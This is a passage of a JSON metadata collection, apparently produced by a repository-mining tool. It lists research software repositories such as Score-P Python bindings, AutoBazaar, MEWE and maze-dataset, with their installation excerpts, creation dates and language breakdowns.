    "446": {
        "filename": "score-p_scorep_binding_python_2024-10-04.json",
        "code_repository": [
            {
                "result": {
                    "value": "https://github.com/score-p/scorep_binding_python",
                    "type": "Url"
                },
                "confidence": 1,
                "technique": "GitHub_API"
            }
        ],
        "installation_instructions": [
            {
                "result": {
                    "value": "You need at least Score-P 5.0, build with `--enable-shared` and the gcc compiler plugin.\nPlease make sure that `scorep-config` is in your `PATH` variable.\n\nFor Ubuntu LTS systems there is a non-official ppa of Score-P available: https://launchpad.net/~andreasgocht/+archive/ubuntu/scorep .\n\nThen install the package from PyPI\n\n```\npip install scorep\n```\n\nor build them from source \n\n\n```\npip install .\n```\n",
                    "type": "Text_excerpt",
                    "original_header": "Install"
                },
                "confidence": 1,
                "technique": "header_analysis",
                "source": "https://raw.githubusercontent.com/score-p/scorep_binding_python/master/README.md"
            }
        ],
        "date_created": [
            {
                "result": {
                    "value": "2017-06-21T15:53:12Z",
                    "type": "Date"
                },
                "confidence": 1,
                "technique": "GitHub_API"
            }
        ],
        "date_updated": [
            {
                "result": {
                    "value": "2024-04-30T12:02:01Z",
                    "type": "Date"
                },
                "confidence": 1,
                "technique": "GitHub_API"
            }
        ],
        "programming_languages": [
            {
                "result": {
                    "value": "Python",
                    "name": "Python",
                    "type": "Programming_language",
                    "size": 79207
                },
                "confidence": 1,
                "technique": "GitHub_API"
            },
            {
                "result": {
                    "value": "C++",
                    "name": "C++",
                    "type": "Programming_language",
                    "size": 42140
                },
                "confidence": 1,
                "technique": "GitHub_API"
            },
            {
                "result": {
                    "value": "C",
                    "name": "C",
                    "type": "Programming_language",
                    "size": 17779
                },
                "confidence": 1,
                "technique": "GitHub_API"
            },
            {
                "result": {
                    "value": "CMake",
                    "name": "CMake",
                    "type": "Programming_language",
                    "size": 6889
                },
                "confidence": 1,
                "technique": "GitHub_API"
            },
            {
                "result": {
                    "value": "Shell",
                    "name": "Shell",
                    "type": "Programming_language",
                    "size": 819
                },
                "confidence": 1,
                "technique": "GitHub_API"
            }
        ]
    },
    "447": {
        "filename": "se2p_nuzzlebug_2024-10-04.json",
        "code_repository": [
            {
                "result": {
                    "value": "https://github.com/se2p/NuzzleBug",
                    "type": "Url"
                },
                "confidence": 1,
                "technique": "GitHub_API"
            }
        ],
        "installation_instructions": "No installation instructions found.",
        "date_created": [
            {
                "result": {
                    "value": "2023-09-15T06:00:31Z",
                    "type": "Date"
                },
                "confidence": 1,
                "technique": "GitHub_API"
            }
        ],
        "date_updated": [
            {
                "result": {
                    "value": "2024-07-07T16:14:27Z",
                    "type": "Date"
                },
                "confidence": 1,
                "technique": "GitHub_API"
            }
        ],
        "programming_languages": [
            {
                "result": {
                    "value": "JavaScript",
                    "name": "JavaScript",
                    "type": "Programming_language",
                    "size": 1946099
                },
                "confidence": 1,
                "technique": "GitHub_API"
            },
            {
                "result": {
                    "value": "CSS",
                    "name": "CSS",
                    "type": "Programming_language",
                    "size": 155671
                },
                "confidence": 1,
                "technique": "GitHub_API"
            },
            {
                "result": {
                    "value": "Shell",
                    "name": "Shell",
                    "type": "Programming_language",
                    "size": 1974
                },
                "confidence": 1,
                "technique": "GitHub_API"
            },
            {
                "result": {
                    "value": "EJS",
                    "name": "EJS",
                    "type": "Programming_language",
                    "size": 704
                },
                "confidence": 1,
                "technique": "GitHub_API"
            }
        ]
    },
    "448": {
        "filename": "HDI-Project_AutoBazaar_2024-10-03.json",
        "code_repository": [
            {
                "result": {
                    "value": "https://github.com/MLBazaar/AutoBazaar",
                    "type": "Url"
                },
                "confidence": 1,
                "technique": "GitHub_API"
            }
        ],
        "installation_instructions": [
            {
                "result": {
                    "value": "The easiest and recommended way to install **AutoBazaar** is using\n[pip](https://pip.pypa.io/en/stable/):\n\n```\npip install autobazaar\n```\n\nThis will pull and install the latest stable release from [PyPI](https://pypi.org/).\n\nIf you want to install from source or contribute to the project please read the\n[Contributing Guide](https://MLBazaar.github.io/AutoBazaar/contributing.html#get-started).\n",
                    "type": "Text_excerpt",
                    "original_header": "Install with pip",
                    "parent_header": [
                        "Install"
                    ]
                },
                "confidence": 1,
                "technique": "header_analysis",
                "source": "https://raw.githubusercontent.com/HDI-Project/AutoBazaar/master/README.md"
            },
            {
                "result": {
                    "value": "Make sure to have your data prepared in the [Data Format](#data-format) explained above inside\nand uncompressed folder in a filesystem directly accessible by **AutoBazaar**.\n\nIn order to check, whether your dataset is available and ready to use, you can execute\nthe `abz` command in your command line with its `list` subcommand.\nIf your dataset is in a different place than inside a folder called `data` within your\ncurrent working directory, do not forget to add the `-i` argument to your command indicating\nthe path to the folder that contains your dataset.\n\nAssuming that the data is inside a folder called `input` within your current folder,\nyou can run:\n\n```\n$ abz list -i /path/to/your/datasets/folder\n```\n\nThe output should be a table which includes the details of all the datasets found inside\nthe indicated directory:\n\n```\n             data_modality                task_type task_subtype             metric size_human  train_samples\ndataset\n185_baseball  single_table           classification  multi_class            f1Macro       148K           1073\n196_autoMpg   single_table               regression   univariate   meanSquaredError        32K            298\n30_personae           text           classification       binary                 f1       1,4M            116\n32_wikiqa      multi_table           classification       binary                 f1       4,9M          23406\n60_jester     single_table  collaborative_filtering               meanAbsoluteError        44M         880719\n```\n\n**Note:** If you see an error saying that `No matching datasets found`, please review your\ndataset format and make sure to have indicated the right path.\n\nFor the rest of this quickstart, we will be using the `185_baseball` dataset that you can\nfind inside the [input folder](https://github.com/MLBazaar/AutoBazaar/tree/master/input)\ncontained in this repository.\n",
                    "type": "Text_excerpt",
                    "original_header": "1. Prepare your Data",
                    "parent_header": [
                        "Quickstart"
                    ]
                },
                "confidence": 1,
                "technique": "header_analysis",
                "source": "https://raw.githubusercontent.com/HDI-Project/AutoBazaar/master/README.md"
            },
            {
                "result": {
                    "type": "Text_excerpt",
                    "value": "* License: [MIT](https://github.com/MLBazaar/AutoBazaar/blob/master/LICENSE)\n* Development Status: [Pre-Alpha](https://pypi.org/search/?c=Development+Status+%3A%3A+2+-+Pre-Alpha)\n* Documentation: https://MLBazaar.github.io/AutoBazaar/\n* Homepage: https://github.com/MLBazaar/AutoBazaar\n* Paper: https://arxiv.org/pdf/1905.08942.pdf\n \n",
                    "original_header": "AutoBazaar"
                },
                "confidence": 0.9999942165270265,
                "technique": "supervised_classification",
                "source": "https://raw.githubusercontent.com/HDI-Project/AutoBazaar/master/README.md"
            },
            {
                "result": {
                    "type": "Text_excerpt",
                    "value": "In this short tutorial we will guide you through a series of steps that will help you getting\nstarted with **AutoBazaar** using its CLI command `abz`. \n",
                    "original_header": "Quickstart"
                },
                "confidence": 0.9866143646789544,
                "technique": "supervised_classification",
                "source": "https://raw.githubusercontent.com/HDI-Project/AutoBazaar/master/README.md"
            },
            {
                "result": {
                    "type": "Text_excerpt",
                    "value": "The output will be a table similar to this one:\n```\n                                          pipeline     score      rank  cv_score   metric data_modality       task_type task_subtype    elapsed  iterations  load_time  trivial_time  fit_time    cv_time error  step\ndataset\n185_baseball  fce28425-e45c-4620-9d3c-d329b8684bea  0.316961  0.682957  0.317043  f1Macro  single_table  classification  multi_class  10.024457         0.0   0.011041      0.026212       NaN        NaN  None  None\n185_baseball  f7428924-79ee-439d-bc32-998a9efea619  0.675132  0.390927  0.609073  f1Macro  single_table  classification  multi_class  21.412262         1.0   0.011041      0.026212   9.99484        NaN  None  None\n185_baseball  397780a5-6bf6-48c9-9a85-06b0d08c5a9d  0.675132  0.357361  0.642639  f1Macro  single_table  classification  multi_class  31.712946         2.0   0.011041      0.026212   9.99484  12.618179  None  None\n```\nAlternatively, a `-r` option can be passed with the name of a CSV file, and the results will\nbe stored there:\n```bash\nabz search 185_baseball -c10,20,30 -b10 -r results.csv\n```\n \n",
                    "original_header": "3. Explore the results"
                },
                "confidence": 0.9999450207563471,
                "technique": "supervised_classification",
                "source": "https://raw.githubusercontent.com/HDI-Project/AutoBazaar/master/README.md"
            }
        ],
        "date_created": [
            {
                "result": {
                    "value": "2019-05-31T01:36:02Z",
                    "type": "Date"
                },
                "confidence": 1,
                "technique": "GitHub_API"
            }
        ],
        "date_updated": [
            {
                "result": {
                    "value": "2024-09-29T13:46:25Z",
                    "type": "Date"
                },
                "confidence": 1,
                "technique": "GitHub_API"
            }
        ],
        "programming_languages": [
            {
                "result": {
                    "value": "Python",
                    "name": "Python",
                    "type": "Programming_language",
                    "size": 49238
                },
                "confidence": 1,
                "technique": "GitHub_API"
            },
            {
                "result": {
                    "value": "Makefile",
                    "name": "Makefile",
                    "type": "Programming_language",
                    "size": 6975
                },
                "confidence": 1,
                "technique": "GitHub_API"
            },
            {
                "result": {
                    "value": "Dockerfile",
                    "name": "Dockerfile",
                    "type": "Programming_language",
                    "size": 425
                },
                "confidence": 1,
                "technique": "GitHub_API"
            }
        ]
    },
    "449": {
        "filename": "hsu-aut_CSS-AAS-OWL_2024-10-04.json",
        "code_repository": [
            {
                "result": {
                    "value": "https://github.com/hsu-aut/CSS-AAS-OWL",
                    "type": "Url"
                },
                "confidence": 1,
                "technique": "GitHub_API"
            }
        ],
        "installation_instructions": "No installation instructions found.",
        "date_created": [
            {
                "result": {
                    "value": "2023-06-09T08:12:54Z",
                    "type": "Date"
                },
                "confidence": 1,
                "technique": "GitHub_API"
            }
        ],
        "date_updated": [
            {
                "result": {
                    "value": "2023-07-31T06:57:22Z",
                    "type": "Date"
                },
                "confidence": 1,
                "technique": "GitHub_API"
            }
        ],
        "programming_languages": "No programming languages found."
    },
    "450": {
        "filename": "Jacarte_MEWE_2024-10-04.json",
        "code_repository": [
            {
                "result": {
                    "value": "https://github.com/ASSERT-KTH/MEWE",
                    "type": "Url"
                },
                "confidence": 1,
                "technique": "GitHub_API"
            }
        ],
        "installation_instructions": [
            {
                "result": {
                    "type": "Text_excerpt",
                    "value": "The following example generates a multivariant binary that can execute in your local machine. Make sure you have the LLVM toolchain in your system version 12.\n```bash\ngit clone https://github.com/Jacarte/MEWE\ncd MEWE\nsource mewe.sh\ncd examples/simple\nmewerustc  --llvm-version 12 --generation-timeout 3600 --exploration-timeout 120\n```\n \n",
                    "original_header": "Try it out"
                },
                "confidence": 1.0,
                "technique": "supervised_classification",
                "source": "https://raw.githubusercontent.com/Jacarte/MEWE/main/README.md"
            },
            {
                "result": {
                    "type": "Text_excerpt",
                    "value": "MEWE uses an extended LLVM linker and CROW to build multivariant binaries. In the following diagram, we dissect how it works.  \n",
                    "original_header": "MEWE pipeline"
                },
                "confidence": 0.9720085714521992,
                "technique": "supervised_classification",
                "source": "https://raw.githubusercontent.com/Jacarte/MEWE/main/README.md"
            }
        ],
        "date_created": [
            {
                "result": {
                    "value": "2021-01-13T16:48:36Z",
                    "type": "Date"
                },
                "confidence": 1,
                "technique": "GitHub_API"
            }
        ],
        "date_updated": [
            {
                "result": {
                    "value": "2024-09-04T08:30:45Z",
                    "type": "Date"
                },
                "confidence": 1,
                "technique": "GitHub_API"
            }
        ],
        "programming_languages": [
            {
                "result": {
                    "value": "LLVM",
                    "name": "LLVM",
                    "type": "Programming_language",
                    "size": 8768815
                },
                "confidence": 1,
                "technique": "GitHub_API"
            },
            {
                "result": {
                    "value": "Python",
                    "name": "Python",
                    "type": "Programming_language",
                    "size": 186982
                },
                "confidence": 1,
                "technique": "GitHub_API"
            },
            {
                "result": {
                    "value": "Rust",
                    "name": "Rust",
                    "type": "Programming_language",
                    "size": 59537
                },
                "confidence": 1,
                "technique": "GitHub_API"
            },
            {
                "result": {
                    "value": "C++",
                    "name": "C++",
                    "type": "Programming_language",
                    "size": 54558
                },
                "confidence": 1,
                "technique": "GitHub_API"
            },
            {
                "result": {
                    "value": "Shell",
                    "name": "Shell",
                    "type": "Programming_language",
                    "size": 39234
                },
                "confidence": 1,
                "technique": "GitHub_API"
            },
            {
                "result": {
                    "value": "CMake",
                    "name": "CMake",
                    "type": "Programming_language",
                    "size": 4313
                },
                "confidence": 1,
                "technique": "GitHub_API"
            },
            {
                "result": {
                    "value": "Dockerfile",
                    "name": "Dockerfile",
                    "type": "Programming_language",
                    "size": 689
                },
                "confidence": 1,
                "technique": "GitHub_API"
            }
        ]
    },
    "451": {
        "filename": "orlenyslp_Caterpillar_2024-10-03.json",
        "code_repository": [
            {
                "result": {
                    "value": "https://github.com/orlenyslp/Caterpillar",
                    "type": "Url"
                },
                "confidence": 1,
                "technique": "GitHub_API"
            }
        ],
        "installation_instructions": [
            {
                "result": {
                    "value": "By default, the core of Caterpillar was configured to run on top of Ganache CLI which is a Node.js based Ethereum client for testing and development. It uses ethereumjs to simulate full client behavior and make developing Ethereum applications. All the instructions about the installation can be found here: https://github.com/trufflesuite/ganache-cli/. However, the Ethereum Provider can be updated at the beginning of the source code in the controller \"caterpillar-core/src/models/models.controller.ts\" (check the comments).\n\nNote that Ganache CLI is written in Javascript and distributed as a Node package via npm. Make sure you have Node.js (>= v6.11.5) installed. Besides, be aware to start the Ganache CLI server before running the applications Caterpillar Core and Services Manager. In that respect, you only need to open a terminal on your computer and run the command:\n\n     ganache-cli\n",
                    "type": "Text_excerpt",
                    "original_header": "Installing Ganache CLI",
                    "parent_header": [
                        "Caterpillar"
                    ]
                },
                "confidence": 1,
                "technique": "header_analysis",
                "source": "https://raw.githubusercontent.com/orlenyslp/Caterpillar/master/README.md"
            },
            {
                "result": {
                    "type": "Text_excerpt",
                    "value": "For running Caterpillar locally, download the source code from the repository and follow the next steps to set up the applications and install the required dependencies. For running caterpillar from a Docker image go directly to the last section of this document. Be aware that the Docker image works only on the version v1.0.\n \n",
                    "original_header": "Caterpillar"
                },
                "confidence": 0.9999458393086353,
                "technique": "supervised_classification",
                "source": "https://raw.githubusercontent.com/orlenyslp/Caterpillar/master/README.md"
            }
        ],
        "date_created": [
            {
                "result": {
                    "value": "2017-06-17T12:53:25Z",
                    "type": "Date"
                },
                "confidence": 1,
                "technique": "GitHub_API"
            }
        ],
        "date_updated": [
            {
                "result": {
                    "value": "2024-09-27T12:48:07Z",
                    "type": "Date"
                },
                "confidence": 1,
                "technique": "GitHub_API"
            }
        ],
        "programming_languages": [
            {
                "result": {
                    "value": "TypeScript",
                    "name": "TypeScript",
                    "type": "Programming_language",
                    "size": 1583425
                },
                "confidence": 1,
                "technique": "GitHub_API"
            },
            {
                "result": {
                    "value": "HTML",
                    "name": "HTML",
                    "type": "Programming_language",
                    "size": 315942
                },
                "confidence": 1,
                "technique": "GitHub_API"
            },
            {
                "result": {
                    "value": "Solidity",
                    "name": "Solidity",
                    "type": "Programming_language",
                    "size": 238540
                },
                "confidence": 1,
                "technique": "GitHub_API"
            },
            {
                "result": {
                    "value": "Java",
                    "name": "Java",
                    "type": "Programming_language",
                    "size": 71238
                },
                "confidence": 1,
                "technique": "GitHub_API"
            },
            {
                "result": {
                    "value": "JavaScript",
                    "name": "JavaScript",
                    "type": "Programming_language",
                    "size": 18258
                },
                "confidence": 1,
                "technique": "GitHub_API"
            },
            {
                "result": {
                    "value": "ANTLR",
                    "name": "ANTLR",
                    "type": "Programming_language",
                    "size": 7876
                },
                "confidence": 1,
                "technique": "GitHub_API"
            },
            {
                "result": {
                    "value": "CSS",
                    "name": "CSS",
                    "type": "Programming_language",
                    "size": 4270
                },
                "confidence": 1,
                "technique": "GitHub_API"
            },
            {
                "result": {
                    "value": "Dockerfile",
                    "name": "Dockerfile",
                    "type": "Programming_language",
                    "size": 675
                },
                "confidence": 1,
                "technique": "GitHub_API"
            },
            {
                "result": {
                    "value": "Shell",
                    "name": "Shell",
                    "type": "Programming_language",
                    "size": 303
                },
                "confidence": 1,
                "technique": "GitHub_API"
            }
        ]
    },
    "452": {
        "filename": "thomas-vogel_mRUBiS_2024-10-03.json",
        "code_repository": [
            {
                "result": {
                    "value": "https://github.com/thomas-vogel/mRUBiS",
                    "type": "Url"
                },
                "confidence": 1,
                "technique": "GitHub_API"
            }
        ],
        "installation_instructions": [
            {
                "result": {
                    "value": "mRUBiS has been developed as an Eclipse plug-in. Use the [Eclipse Oxygen.2 (4.7.2) Release with the Eclipse Modeling Tools package](http://www.eclipse.org/downloads/packages/eclipse-modeling-tools/oxygen2) and install the mRUBiS plug-in using the following Eclipse update site:\n\n[`https://thomas-vogel.github.io/mRUBiS/`](https://thomas-vogel.github.io/mRUBiS/)\n\nmRUBiS has been developed and tested on Ubuntu 16.04, only basic tests have been made with Windows.\n",
                    "type": "Text_excerpt",
                    "original_header": "Installing mRUBiS"
                },
                "confidence": 1,
                "technique": "header_analysis",
                "source": "https://raw.githubusercontent.com/thomas-vogel/mRUBiS/master/README.md"
            }
        ],
        "date_created": [
            {
                "result": {
                    "value": "2017-12-21T10:52:19Z",
                    "type": "Date"
                },
                "confidence": 1,
                "technique": "GitHub_API"
            }
        ],
        "date_updated": [
            {
                "result": {
                    "value": "2024-09-07T06:19:02Z",
                    "type": "Date"
                },
                "confidence": 1,
                "technique": "GitHub_API"
            }
        ],
        "programming_languages": [
            {
                "result": {
                    "value": "Java",
                    "name": "Java",
                    "type": "Programming_language",
                    "size": 1401014
                },
                "confidence": 1,
                "technique": "GitHub_API"
            }
        ]
    },
    "453": {
        "filename": "squaresLab_LLMAO_2024-10-04.json",
        "code_repository": [
            {
                "result": {
                    "value": "https://github.com/squaresLab/LLMAO",
                    "type": "Url"
                },
                "confidence": 1,
                "technique": "GitHub_API"
            }
        ],
        "installation_instructions": [
            {
                "result": {
                    "type": "Text_excerpt",
                    "value": "2. Unzip it and put the folder in the same path as this repo \n3. Load Codegen final hidden states:\n    change `biggest_model=1` to use Codegen-16B: requires significant amount of GPU vram and storage.\n    `bash codegen_loading.sh` \n4. Train \n    `bash fault_localizer.sh` \n",
                    "original_header": "IV. Train model yourself"
                },
                "confidence": 0.946491202345229,
                "technique": "supervised_classification",
                "source": "https://raw.githubusercontent.com/squaresLab/LLMAO/master/README.md"
            }
        ],
        "date_created": [
            {
                "result": {
                    "value": "2023-03-26T22:57:29Z",
                    "type": "Date"
                },
                "confidence": 1,
                "technique": "GitHub_API"
            }
        ],
        "date_updated": [
            {
                "result": {
                    "value": "2024-09-17T03:48:12Z",
                    "type": "Date"
                },
                "confidence": 1,
                "technique": "GitHub_API"
            }
        ],
        "programming_languages": [
            {
                "result": {
                    "value": "Java",
                    "name": "Java",
                    "type": "Programming_language",
                    "size": 13725403
                },
                "confidence": 1,
                "technique": "GitHub_API"
            },
            {
                "result": {
                    "value": "Python",
                    "name": "Python",
                    "type": "Programming_language",
                    "size": 92164
                },
                "confidence": 1,
                "technique": "GitHub_API"
            },
            {
                "result": {
                    "value": "C",
                    "name": "C",
                    "type": "Programming_language",
                    "size": 2805
                },
                "confidence": 1,
                "technique": "GitHub_API"
            },
            {
                "result": {
                    "value": "Shell",
                    "name": "Shell",
                    "type": "Programming_language",
                    "size": 578
                },
                "confidence": 1,
                "technique": "GitHub_API"
            }
        ]
    },
    "454": {
        "filename": "tsb0601_MultiMon_2024-10-03.json",
        "code_repository": [
            {
                "result": {
                    "value": "https://github.com/tsb0601/MultiMon",
                    "type": "Url"
                },
                "confidence": 1,
                "technique": "GitHub_API"
            }
        ],
        "installation_instructions": [
            {
                "result": {
                    "value": "```\npip install -r requirements.txt\n```\n",
                    "type": "Text_excerpt",
                    "original_header": "Step 0: Install the necessary Python packages",
                    "parent_header": [
                        "<img alt=\"\" src=\"Multimon_emoji.png\" /> Mass-Producing Failures of Multimodal Models with Language Models",
                        "Running and Using MultiMon"
                    ]
                },
                "confidence": 1,
                "technique": "header_analysis",
                "source": "https://raw.githubusercontent.com/tsb0601/MultiMon/main/README.md"
            }
        ],
        "date_created": [
            {
                "result": {
                    "value": "2023-05-30T09:17:25Z",
                    "type": "Date"
                },
                "confidence": 1,
                "technique": "GitHub_API"
            }
        ],
        "date_updated": [
            {
                "result": {
                    "value": "2024-07-02T03:25:55Z",
                    "type": "Date"
                },
                "confidence": 1,
                "technique": "GitHub_API"
            }
        ],
        "programming_languages": [
            {
                "result": {
                    "value": "Python",
                    "name": "Python",
                    "type": "Programming_language",
                    "size": 15874
                },
                "confidence": 1,
                "technique": "GitHub_API"
            }
        ]
    },
    "455": {
        "filename": "pgadient_jandrolyzer_2024-10-03.json",
        "code_repository": [
            {
                "result": {
                    "value": "https://github.com/pgadient/jandrolyzer",
                    "type": "Url"
                },
                "confidence": 1,
                "technique": "GitHub_API"
            }
        ],
        "installation_instructions": [
            {
                "result": {
                    "type": "Text_excerpt",
                    "value": "This folder contains the reconstructed JSON data structures. The detected data type is provided for each variable.\nIf a value could be traced back to a certain JSON variable, the resolved value is provided in place. An example is shown below.\n```\n<...> (found web API URLs)\n<...> (found JSON key-value pairs)\n<...> (found String variables with assigned values)\nJSON DETAILS:\nPath:\n/home/decompiled/sample.apk/src/main/java/com/crashlytics/android/answers/SessionEventTransform.java\nLibrary:\norg.json\nJSON Object: \n{\"advertisingId\":\"<STRING>\",\"buildId\":\"<STRING>\",\"appVersionName\":\"<STRING>\",\"type\":\"<STRING>\",\"appVersionCode\":\"<STRING>\",\"limitAdTrackingEnabled\":\"<BOOLEAN>\",\"betaDeviceToken\":\"<STRING>\",\"executionId\":\"<STRING>\",\"customType\":\"<STRING>\",\"osVersion\":\"<STRING>\",\"predefinedType\":\"<STRING>\",\"appBundleId\":\"<STRING>\",\"deviceModel\":\"<STRING>\",\"installationId\":\"<STRING>\",\"androidId\":\"<STRING>\"}\n<...> (web API URLs with corresponding query parameters)\n<...> (relevant code snippets)\n```\n \n",
                    "original_header": "JSON folder (`oj`)"
                },
                "confidence": 0.9999874068293461,
                "technique": "supervised_classification",
                "source": "https://raw.githubusercontent.com/pgadient/jandrolyzer/master/README.md"
            }
        ],
        "date_created": [
            {
                "result": {
                    "value": "2019-04-26T05:40:02Z",
                    "type": "Date"
                },
                "confidence": 1,
                "technique": "GitHub_API"
            }
        ],
        "date_updated": [
            {
                "result": {
                    "value": "2023-06-13T06:59:20Z",
                    "type": "Date"
                },
                "confidence": 1,
                "technique": "GitHub_API"
            }
        ],
        "programming_languages": [
            {
                "result": {
                    "value": "Java",
                    "name": "Java",
                    "type": "Programming_language",
                    "size": 326660
                },
                "confidence": 1,
                "technique": "GitHub_API"
            }
        ]
    },
    "456": {
        "filename": "sh1doy_summarization_tf_2024-10-04.json",
        "code_repository": [
            {
                "result": {
                    "value": "https://github.com/sh1doy/summarization_tf",
                    "type": "Url"
                },
                "confidence": 1,
                "technique": "GitHub_API"
            }
        ],
        "installation_instructions": [
            {
                "result": {
                    "type": "Text_excerpt",
                    "value": "1. Download raw dataset from [https://github.com/xing-hu/DeepCom]\n2. Parse them with parser.jar\n \n",
                    "original_header": "Dataset"
                },
                "confidence": 0.9999376231014562,
                "technique": "supervised_classification",
                "source": "https://raw.githubusercontent.com/sh1doy/summarization_tf/master/README.md"
            }
        ],
        "date_created": [
            {
                "result": {
                    "value": "2018-09-14T21:20:58Z",
                    "type": "Date"
                },
                "confidence": 1,
                "technique": "GitHub_API"
            }
        ],
        "date_updated": [
            {
                "result": {
                    "value": "2024-02-22T12:25:38Z",
                    "type": "Date"
                },
                "confidence": 1,
                "technique": "GitHub_API"
            }
        ],
        "programming_languages": [
            {
                "result": {
                    "value": "Python",
                    "name": "Python",
                    "type": "Programming_language",
                    "size": 75101
                },
                "confidence": 1,
                "technique": "GitHub_API"
            },
            {
                "result": {
                    "value": "Jupyter Notebook",
                    "name": "Jupyter Notebook",
                    "type": "Programming_language",
                    "size": 19091
                },
                "confidence": 1,
                "technique": "GitHub_API"
            }
        ]
    },
    "457": {
        "filename": "Log-Severity-Level_multivocal-mapping-database_2024-10-04.json",
        "code_repository": [
            {
                "result": {
                    "value": "https://github.com/Log-Severity-Level/multivocal-mapping-database",
                    "type": "Url"
                },
                "confidence": 1,
                "technique": "GitHub_API"
            }
        ],
        "installation_instructions": [
            {
                "result": {
                    "value": "[27 studies](peer-reviewed-literature/studies-final-set.csv)\n\n",
                    "type": "Text_excerpt",
                    "original_header": "Final Set",
                    "parent_header": [
                        "Log Severity Levels Matter: A multivocal mapping  [Database]",
                        "Peer-reviewed literature"
                    ]
                },
                "confidence": 1,
                "technique": "header_analysis",
                "source": "https://raw.githubusercontent.com/Log-Severity-Level/multivocal-mapping-database/main/README.md"
            },
            {
                "result": {
                    "type": "Text_excerpt",
                    "value": "    - Python: [Result](logging-libraries/prints/logging-library-Python-Google-Search.pdf)\n    - Java: [Result](logging-libraries/prints/logging-library-Java-Google-Search.pdf)\n    - JavaScript: [Result](logging-libraries/prints/logging-library-JavaScript-Google-Search.pdf)\n    - C#: [Result](logging-libraries/prints/logging-library-C#-Google-Search.pdf)\n    - C: [Result](logging-libraries/prints/logging-library-C-Google-Search.pdf)\n    - C++: [Result](logging-libraries/prints/logging-library-C++-Google-Search.pdf)\n    - PHP: [Result](logging-libraries/prints/logging-library-php-Google-Search.pdf)\n    - R: [Result](logging-libraries/prints/logging-library-R-Google-Search.pdf)\n    - Objective-C: [Result](logging-libraries/prints/logging-library-ObjectiveC-Google-Search.pdf)\n    - TypeScript: [Result](logging-libraries/prints/logging-library-Typescript-Google-Search.pdf)\n    - Swift: [Result](logging-libraries/prints/logging-library-Swift-Google-Search.pdf)\n    - Kotlin: [Result](logging-libraries/prints/logging-library-Kotlin-Google-Search.pdf)\n    - Matlab: [Result](logging-libraries/prints/logging-library-Matlab-Google-Search.pdf)\n    - Go: [Result](logging-libraries/prints/logging-library-php-Golang-Search.pdf)\n    - Rust: [Result](logging-libraries/prints/logging-library-Rust-Google-Search.pdf)\n    - VBA: [Result](logging-libraries/prints/logging-library-VBA-Google-Search.pdf)\n    - Ruby: [Result](logging-libraries/prints/logging-library-Ruby-Golang-Search.pdf) \n",
                    "original_header": "Logging libraries"
                },
                "confidence": 0.9856415203721076,
                "technique": "supervised_classification",
                "source": "https://raw.githubusercontent.com/Log-Severity-Level/multivocal-mapping-database/main/README.md"
            }
        ],
        "date_created": [
            {
                "result": {
                    "value": "2021-09-02T17:44:23Z",
                    "type": "Date"
                },
                "confidence": 1,
                "technique": "GitHub_API"
            }
        ],
        "date_updated": [
            {
                "result": {
                    "value": "2022-03-15T17:32:16Z",
                    "type": "Date"
                },
                "confidence": 1,
                "technique": "GitHub_API"
            }
        ],
        "programming_languages": [
            {
                "result": {
                    "value": "TeX",
                    "name": "TeX",
                    "type": "Programming_language",
                    "size": 11132
                },
                "confidence": 1,
                "technique": "GitHub_API"
            }
        ]
    },
    "458": {
        "filename": "understanding-search_maze-dataset_2024-10-03.json",
        "code_repository": [
            {
                "result": {
                    "value": "https://github.com/understanding-search/maze-dataset",
                    "type": "Url"
                },
                "confidence": 1,
                "technique": "GitHub_API"
            }
        ],
        "installation_instructions": [
            {
                "result": {
                    "value": "This package is [available on PyPI](https://pypi.org/project/maze-dataset/), and can be installed via\n```\npip install maze-dataset\n```\n",
                    "type": "Text_excerpt",
                    "original_header": "Installation"
                },
                "confidence": 1,
                "technique": "header_analysis",
                "source": "https://raw.githubusercontent.com/understanding-search/maze-dataset/main/README.md"
            },
            {
                "result": {
                    "type": "Text_excerpt",
                    "value": "- our notebooks serve as a good starting point for understanding the package:\n    - the [notebooks](https://understanding-search.github.io/maze-dataset/notebooks) page in the docs has links to the rendered notebooks\n    - the [`notebooks`](https://github.com/understanding-search/maze-dataset/tree/main/notebooks) folder has the source notebooks\n- combined, single page docs are available as:\n    - [plain text](https://understanding-search.github.io/maze-dataset/combined/maze_dataset.txt)\n    - [html](https://understanding-search.github.io/maze-dataset/combined/maze_dataset.html)\n    - [github markdown](https://github.com/understanding-search/maze-dataset/tree/main/docs/combined/maze_dataset.md)\n    - [pandoc markdown](https://github.com/understanding-search/maze-dataset/tree/main/docs/combined/maze_dataset.md)\n- test coverage reports are available on the [coverage](https://understanding-search.github.io/maze-dataset/coverage) page or the [`coverage/`](https://github.com/understanding-search/maze-dataset/tree/main/docs/coverage) folder\n- generation benchmark results are available on the [benchmarks](https://understanding-search.github.io/maze-dataset/benchmarks) page or the [`benchmarks/`](https://github.com/understanding-search/maze-dataset/tree/main/docs/benchmarks) folder\n \n",
                    "original_header": "Docs"
                },
                "confidence": 0.9183357038948473,
                "technique": "supervised_classification",
                "source": "https://raw.githubusercontent.com/understanding-search/maze-dataset/main/README.md"
            },
            {
                "result": {
                    "type": "Text_excerpt",
                    "value": "This project uses [Poetry](https://python-poetry.org/docs/#installation) for development. To install with dev requirements, run\n```\npoetry install --with dev\n``` \n- `make help` will print all available commands\n- all tests via `make test`\n    - unit tests via `make unit`\n    - notebook tests via `make test_notebooks`\n- formatter (black, pycln, and isort) via `make format`\n    - formatter in check-only mode via `make check-format` \n",
                    "original_header": "Development"
                },
                "confidence": 0.9983944372896453,
                "technique": "supervised_classification",
                "source": "https://raw.githubusercontent.com/understanding-search/maze-dataset/main/README.md"
            }
        ],
        "date_created": [
            {
                "result": {
                    "value": "2023-06-07T15:12:18Z",
                    "type": "Date"
                },
                "confidence": 1,
                "technique": "GitHub_API"
            }
        ],
        "date_updated": [
            {
                "result": {
                    "value": "2024-09-10T19:33:58Z",
                    "type": "Date"
                },
                "confidence": 1,
                "technique": "GitHub_API"
            }
        ],
        "programming_languages": [
            {
                "result": {
                    "value": "Jupyter Notebook",
                    "name": "Jupyter Notebook",
                    "type": "Programming_language",
                    "size": 1097056
                },
                "confidence": 1,
                "technique": "GitHub_API"
            },
            {
                "result": {
                    "value": "Python",
                    "name": "Python",
                    "type": "Programming_language",
                    "size": 445273
                },
                "confidence": 1,
                "technique": "GitHub_API"
            },
            {
                "result": {
                    "value": "Makefile",
                    "name": "Makefile",
                    "type": "Programming_language",
                    "size": 8819
                },
                "confidence": 1,
                "technique": "GitHub_API"
            }
        ]
    },
    "459": {
        "filename": "Ahmedfir_mBERTa_2024-10-03.json",
        "code_repository": [
            {
                "result": {
                    "value": "https://github.com/Ahmedfir/mBERTa",
